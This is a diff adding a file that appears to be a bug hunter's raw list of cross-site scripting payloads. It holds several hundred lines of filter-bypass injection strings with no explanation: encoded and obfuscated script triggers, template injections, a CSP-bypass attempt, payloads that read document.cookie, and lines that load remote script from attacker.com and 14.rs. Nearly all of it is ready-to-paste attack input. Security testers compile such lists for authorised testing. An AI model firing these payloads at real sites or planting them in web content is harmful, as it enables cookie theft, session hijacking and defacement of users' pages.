@@ -1,0 +1,254 @@
+"><svg onauxclick=&#x63&#x6F&#x5C&#x75&#x30&#x30&#x36&#x65&#x66&#x69&#x72&#x6D(`XSS`)><rect x="0" y="0" width="800" height="75" fill="red"></rect><text x="5" y="50" font-family="Verdana" font-size="30" fill="blue">RIGHT CLICK HERE</text><!-- x
+
+
+ javascript:alert('https://google.com/')
+
+ JAVASCRIPT:alert()
+ 
+ http://google.com/\"onclick=alert()
+
+ javascript://whitelisturl.com%0Aalert()
+
+https://x'-alert(1)-'@www.google.com/test
+
+[SPASI]javascript:alert()
+
+jav&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;()&rpar;
+
+
+"><!'/*"*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //>#
+
+
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+
+<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
+
+script>alert(document.head.innerHTML.substr(77, 97, 120));</script>
+
+“><svg/on</script>laod=alert>
+
+<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
+<script>alert(document.head.innerHTML.substr(77, 97, 120));</script>
+
+
+%3Csvg+on+onload%3D%28alert%29%28document.domain%29%3E
+
+<sc#ipt>alert(1)</script>
+
+javascript:alert(1)
+data:text/html,<svg onload=alert(1)>
+
+‘}alert(1);{‘
+‘}alert(1)%0A{‘
+\’}alert(1);{//
+
+
+‘onload=alert(1)><svg/1=’
+
+‘>alert(1)</script><script/1=’
+
+*/alert(1)</script><script>/*
+
+<ScRipT x> alert ('XSS') </ ScRipT X>
+
+“><a href=”#” onmouseleave=alert(99)>Click
+
+<object data=javascript:confirm()>
+
+<a href=javascript:confirm()>click here
+
+<script src=//14.rs></script>
+
+<script>confirm()</script>
+
+a;%3CScRipT%20X%3Ealert(%22XSS%20REFLECTED%22)%3C/ScRipT%20X%3E
+
+p=<svg/1=’&q=’onload=alert(1)>
+
+p=<svg 1=’&q=’onload=’/*&r=*/alert(1)’>
+
+“-prompt`1`-”//.
+
+ “-prompt`1`-”//.
+
+<!DOCTYPE html>
+<html>
+ <head>
+ <title>CSP Test</title>
+  <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
+ </head>
+ <body>
+ <script>alert(document.domain);</script>
+ </body>
+</html>
+
+
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
+
+
+
+%ff<!---><svg/onload=top[/al/.source+/ert/.source]&lpar;)>
+"><style>
+
+
+@keyframes
+ x{}</style><xss style="animation-name:x" onanimationend="[].map(alert('xss'))"></xss>>
+ 
+
+"onmouseover="alert(1)
+
+\"-alert(2)}//
+
+${alert(3)}
+
+<img src=1 onerror=alert(document.domain)>
+
+<><img src=1 onerror=alert(3)>
+
+{{$on.constructor('alert(4)')()}}
+
+javascript:alert(document.cookie)
+
+"><svg><animatetransform onbegin=alert(5)>
+
+'>"></title></style></textarea></script><script/src=attacker.com/js></script>
+
+?msg=<img/src=`%00`%20onerror=this.onerror=confirm(6)
+
+&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+
+&toString().constructor.prototype.charAt%3d[].join;[7]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+
+<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
+
+<svg/onload=eval(atob(‘YWxlcnQoZG9jdW1lbnQuY29va2llKQ==’))>
+
+http://foo?&apos;-alert(8)-&apos;
+
+
+"></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
+</textarea><ScRiPt>prompt(/hack the planet/)</ScRiPt//
+
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
+ 
+
+ %22%3E%3C/script%3E%3Csvg%20onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)%3E%3C/textarea%3E%3CScRiPt%3Eprompt(document.cookie)%3C/ScRiPt//
+
+dz7b'-prompt(1)-'nrito
+
+
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+
+aE4ZO0UPECswAxliCzE
+
+"><!'/*"*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //>#
+
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+
+<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
+
+<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[document.domain])</script>
+
+
+
+
+</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>
+
+<script>alert(document.head.innerHTML.substr(77, 97, 120));</script>
+
+
+
+<script>alert(document.domain)</script>
+
+
+<object onerror=javascript:javascript:alert(1)>
+
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(2);">]]</C><X></xml>
+
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(document.cookie)&amp;gt;>">
+
+"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
+
+
+ <img src="https://www.icegif.com/wp-content/uploads/2022/01/icegif-165.gif" width="500" height="600">
+
+
+
+%3Csvg+on+onload%3D%28alert%29%28document.domain%29%3E
+
+
+test%3Csvg+on+onload%3D%28alert%29%28document.domain%29%3E
+
+%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+
+abc`;return+false});});alert`xss`;</script>
+
+<script/src=//Ǌ.₨></script>
+
+<img src=x onerror="poc = new XMLHttpRequest()">
+
+
+<s%08c%08r%08i%08p%08t>al%08ert%08()<%08/%08s%08c%08r%08i%08p%08t%08>
+
+</script><script>alert('XSS');</script>
+
+window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]
+
+this['ale'+(!![]+[])[-~[]]+(!![]+[])[+[]]]()
+
+this['x64x6fx63x75x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'kie']
+
+document['x63x6fx6fx6bx69x65']
+
+><iframe/src=javascript:alert%26%23x000000028%3b)>
+
+x"><svg%250donload%3D"window%5B%27alert%27%5D(location[%27hostname%27])
+
+<a&id=><script+&id=>a=alert&id=a(1)//&id=</script+&id=>
+
+
+"><h1 style=color:red>ibrahimhaxor:)</h1>
+
+
+<img src="https://cutewallpaper.org/21/wallpaper-anonymous/50+-Anonymous-Wallpaper-iPhone-on-WallpaperSafari.jpg">
+
+
+
+
+<h1><marquee>hello</marque></h1>
+
+<h1>Hello,<script>alert(1)</script>!</h1> (for both see xss and htmlI)
+
+<TAG RESOURCE=javascript:alert(1)>
+
+<iframe src=javascript:alert(1)>
+
+<object data=javascript:alert(1)>
+
+<script>alert(document.domain)</script>   ((xss + HTMLI) 
+
+*/</script>'>alert(1)/*<script/1='
+
+<marquee><script>alert('XSS')</script></marquee>
+
+"><script alert(String.fromCharCode(88,83,83))</script>
+
+'>><marquee><h1>XSS</h1></marquee>
+
+'">><script>alert('XSS')</script>
+
+'">><marquee><h1>XSS</h1></marquee>
+
+
+
+
+
+
+
+
